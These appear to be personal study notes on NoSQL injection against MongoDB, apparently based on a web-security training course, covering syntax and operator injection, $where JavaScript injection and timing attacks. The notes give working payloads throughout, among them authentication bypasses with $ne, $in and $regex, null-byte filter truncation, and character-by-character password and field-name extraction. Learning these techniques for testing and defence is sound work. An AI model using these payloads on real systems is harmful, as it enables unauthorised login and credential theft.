**NoSQL databases** store and retrieve data in a format other than traditional SQL relational tables. They are designed to handle large volumes of unstructured or semi-structured data. As such they typically have *fewer relational constraints and consistency checks* than SQL, and claim significant benefits in terms of scalability, flexibility, and performance.

## NoSQL Database Models

![[Pasted image 20231016190419.png]]

Some common types of NoSQL databases include:

- **Document stores** - These store data in flexible, semi-structured documents. They typically use formats such as JSON, BSON, and XML, and are queried in an API or query language. Examples include MongoDB and Couchbase.
- **Key-value stores** - These store data in a key-value format. Each data field is associated with a unique key string. Values are retrieved based on the unique key. Examples include Redis and Amazon DynamoDB.
- **Wide-column stores** - These organize related data into flexible column families rather than traditional rows. Examples include Apache Cassandra and Apache HBase.
- **Graph databases** - These use nodes to store data entities, and edges to store relationships between entities. Examples include Neo4j and Amazon Neptune.


##### Types of NoSQL Injection
There are two different types of NoSQL injection:
- **Syntax injection** - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in SQL injection. However the nature of the attack varies significantly, as NoSQL databases use a range of query languages, types of query syntax, and different data structures.
- **Operator injection** - This occurs when you can use NoSQL query operators to manipulate queries.

---
# Syntax Injection in MongoDB
Consider a shopping application that displays products in different categories. When the user selects the Fizzy drinks category, their browser requests the following URL:
`https://insecure-website.com/product/lookup?category=fizzy`

This causes the application to send a JSON query to retrieve relevant products from the product collection in the MongoDB database:
`this.category == 'fizzy'`
To test whether the input may be vulnerable, submit a fuzz string in the value of the category parameter. An example string for MongoDB is:
```js
'"`{
;$Foo}
$Foo \xYZ
```

Use the fuzz string to construct the following attack :-
```http
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```
If this *causes a change* from the original response, this may indicate that *user input isn't filtered or sanitized* correctly.

###### Note
NoSQL injection vulnerabilities can occur in a variety of contexts, and you need to adapt your fuzz strings accordingly. Otherwise, you may simply trigger validation errors that mean the application never executes your query.

In this example, we're injecting the fuzz string via the URL, so the string is URL-encoded. In some applications, you may need to inject your payload via a <mark style="background: #FFF3A3A6;">JSON</mark> property instead. In this case, this payload would become :-
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000


### Determining which characters are processed
To determine which characters are interpreted as syntax by the application, you can inject individual characters. For example, you could submit ', which results in the following MongoDB query:
```js
this.category == '''
```
If this *causes a change* from the original response, this may indicate that the *' character has broken the query syntax* and caused a syntax error. 
You can confirm this by submitting a valid query string in the input, for example by escaping the quote:
```js
this.category == '\''
```
If this *doesn't cause a syntax error*, this may mean that the *application is vulnerable to an injection attack*.

### Confirming conditional behavior
After detecting a vulnerability, the next step is to determine whether you can influence Boolean conditions using NoSQL syntax.

To test this, send two requests, one with a false condition and one with a true condition. For example you could use the conditional statements` ' && 0 && 'x` and `' && 1 && 'x` as follows:
```http
<!-- False condition --!>
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x

<!-- True condition --!>
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```
If the application behaves differently, this suggests that the false condition impacts the query logic, but the true condition doesn't. This indicates that injecting this style of syntax impacts a server-side query.

## Overriding existing conditions
Now that you have identified that you can influence Boolean conditions, you can attempt to override existing conditions to exploit the vulnerability. For example, you can inject a JavaScript condition that always evaluates to true, such as `'||1||'`:
```http
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27
```

This results in the following MongoDB query:
```js
this.category == 'fizzy'||'1'=='1'
```

As the injected condition is always true, the modified query returns all items. This enables you to view all the products in any category, including hidden or unknown categories.

You could also add a **null payload injection** after the category value.
For example, the query may have an additional `this.released` restriction:
```js
this.category == 'fizzy' && this.released == 1
```
The restriction `this.released == 1` is used to only show products that are released. For unreleased products, presumably `this.released == 0`.

In this case, an attacker could construct an attack as follows:
```http
https://insecure-website.com/product/lookup?category=fizzy'%00
```
This results in the following NoSQL query:
```js
this.category == 'fizzy'\u0000' && this.released == 1
```
If MongoDB ignores all characters after the null character, this removes the requirement for the released field to be set to 1. As a result, all products in the fizzy category are displayed, including unreleased products.

---
# Operator Injection
`$where` - Matches documents that satisfy a JavaScript expression.
`$ne` - Matches all values that are not equal to a specified value.
`$in` - Matches all of the values specified in an array.
`$regex` - Selects documents where values match a specified regular expression.
`$gt` - Matches all values that are greater than the specified value.
`$lt` - Matches all values that are lesser than the specified value.
`$gte` - Matches all values that are greater than/equal to the specified value.
`$lte` - Matches all values that are lesser than/equal to the specified value.


### Submitting Query Parameters
1) JSON-based Input
```js
{"username":"weiner"}
// Becomes
{"username":{"$ne":"invalid"}}
```

2) URL-based Input
```http
http://10.93.23.12/?username=weiner
Becomes
http://10.93.23.12/?username[$ne]=invalid
```

If this doesn't work :-
- Convert the request method from `GET` to `POST`.
- Change the Content-Type header to **application/json**.
- Add JSON to the message body.
- Inject query operators in the JSON.

```js
// Print all credentials in the database
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}

// Target a specific account
{"username":"peter","password":{"$ne":"invalid"}}

// Target a list of accounts
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}

// If you don't know the username
{"username":{"$regex":"admin*"},"password":{"$ne":"invalid"}}

// Using $regex
{"username":"admin","password":{"$regex":"^.*"}}

// This checks whether password begins with 'a'
{"username":"admin","password":{"$regex":"^a*"}}
```


## Exfiltrating data in MongoDB
In many NoSQL databases, some query operators or functions can run limited JavaScript code, such as MongoDB's `$where` operator and `mapReduce()` function.

Consider a vulnerable application that allows users to look up other registered usernames and displays their role. This triggers a request to the URL:
`https://insecure-website.com/user/lookup?username=admin`

This results in the following NoSQL query of the users collection:
```js
{"$where":"this.username == 'admin'"}
```
As the query uses the `$where` operator, you can attempt to inject JavaScript functions into this query so that it returns sensitive data. For example, you could send the following payload:
```http
admin' && this.password[0] == 'a' || 'a'=='b
OR
admin' && this.password[0] == 'a
# Use Burp Intruder (Cluster Bomb)
```
```http
# Check the Password length first
admin' && this.password.length < 10 || 'a'=='b
OR
admin' && this.password.length < 10
```


### Identifying field names
Because MongoDB handles semi-structured data that doesn't require a fixed schema, you may need to identify valid fields in the collection before you can extract data using JavaScript injection.

For example, to identify whether the MongoDB database contains a password field, you could submit the following payload:
```http
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
```
Send the payload again for an existing field and for a field that doesn't exist. In this example, you know that the username field exists, so you could send the following payloads:
```http
admin' && this.username!=' admin' && this.foo!='
```
If the *password field exists*, you'd expect the response to be identical to the response for the existing field (username), but different to the response for the field that *doesn't exist (foo)*.

#### Injecting operators in MongoDB
Consider a vulnerable application that accepts username and password in the body of a POST request:
```js
{"username":"wiener","password":"peter"}
```
To test whether you can inject operators, you could try adding the $where operator as an additional parameter, then send one request where the condition evaluates to false, and another that evaluates to true. For example:
```js
// False condition
{"username":"wiener","password":"peter", "$where":"0"}

// True condition
{"username":"wiener","password":"peter", "$where":"1"}
```
If there is a difference between the responses, this may indicate that the **JavaScript** expression in the `$where` clause is being *evaluated*.

###### Extracting field names
If you have injected an operator that enables you to run JavaScript, you may be able to use the keys() method to extract the name of data fields. For example, you could submit the following payload:
```js
// This inspects the first data field in the user object and returns the first character of the field name. This enables you to extract the field name character by character (Use Burp Suite Intruder with Cluster Bomb)
// Regex: Matches if first character of the data field name is 'a'
"$where":"Object.keys(this)[0].match('^.{0}a.*')"

// After you find the valid data field, find the correct value for that field (Same way in Burp Suite)
"$where":"this.unlockToken.match('^.{0}a.*')"
```


## Timing Based Injection
To conduct timing-based NoSQL injection:
1) *Load the page several times* to determine a baseline loading time.
2) Insert a timing based payload into the input. A timing based payload causes an intentional delay in the response when executed. For example, `{"$where": "sleep(5000)"}` causes an intentional delay of **5000 ms** on successful injection.
3) Identify whether the response loads more slowly. This indicates a successful injection.

```js
// Trigger a Time Delay if password begins with 'a'
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'

OR

admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```
